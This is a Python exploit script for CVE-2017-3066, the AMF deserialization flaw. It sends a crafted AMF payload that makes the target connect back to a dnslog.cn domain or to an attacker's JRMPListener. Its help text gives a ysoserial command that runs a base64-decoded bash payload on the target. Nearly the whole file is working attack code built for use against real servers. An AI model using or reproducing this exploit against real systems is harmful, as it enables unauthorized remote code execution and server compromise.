# encoding:utf8
# CVE-2017-3066 AMF反序列漏洞
# code by whois
# create 2021/06/04

import struct
import argparse
import requests
import random

requests.packages.urllib3.disable_warnings()
headers = {'Content-Type': 'application/x-amf'}
rand = random.randint(1, 10000)
s = requests.session()

def dnslog():
    r = s.get('http://www.dnslog.cn/getdomain.php')
    domain = r.text
    return str(rand) + '.' + domain

def getrecords():
    r = s.get('http://www.dnslog.cn/getrecords.php')
    con = r.text
    return con

def check(url):
    domain = dnslog()
    callback_IP = str(domain)
    callback_port = 80

    amf_payload = '\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a' + \
              '\x07\x33' + 'sun.rmi.server.UnicastRef' + struct.pack('>H', len(callback_IP)) + callback_IP + \
              struct.pack('>I', int(callback_port)) + \
              '\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00';

    print('[*] Get dnslog domain -> {0}'.format(domain))
    response = s.post(url, headers=headers, data=amf_payload, verify=False)

    if str(rand) in getrecords():
        print('\n[+] Find vulnerable: {}'.format(url))
        print(getrecords())


def exp(url, callback_IP, callback_port):

    amf_payload = '\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a' + \
              '\x07\x33' + 'sun.rmi.server.UnicastRef' + struct.pack('>H', len(callback_IP)) + callback_IP + \
              struct.pack('>I', int(callback_port)) + \
              '\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00'

    print('[*] Send Payload...')
    response = s.post(url, headers=headers, data=amf_payload, verify=False)


def main():
    parser = argparse.ArgumentParser(
        usage='\npython amf_exp.py -m check -u http://xxx.com/xxx/amf\npython amf_exp.py -m exploit -u http://xxx.com/xxx/amf -l JRMPListener',
        description="AMF Exploit Check",
    )


    mod = parser.add_argument_group('MODULES')

    mod.add_argument("-m", dest="module",
                      help="Speciy module [check|exploit]")

    misc = parser.add_argument_group('MISC')
    misc.add_argument("-f", dest="ipfile",
                      help="Speciy target file ")
    misc.add_argument("-u", dest="url",
                      help="Specify url ")
    misc.add_argument("-l", dest="jrmplisten",
                      help="Specify JRMPListener [vps_ip:vps_port]")

    args = parser.parse_args()

    if args.module is None:
        parser.print_help()
        exit(0)

    if args.module == 'check':
        check(args.url)

    if args.module == 'exploit':
        if args.jrmplisten is None:
            print("[*] 需要开启JRMPListener来监听")
            print("[*] java -cp ysoserial.jar ysoserial.exploit.JRMPListener 83 CommonsCollections6 \"bash -c {echo,payloadbase64}|{base64,-d}|{bash,-i}\"")
        else:
            ip = args.jrmplisten.split(':')[0]
            port = args.jrmplisten.split(':')[1]
            exp(args.url, ip, port)

if __name__ == '__main__':
    main()

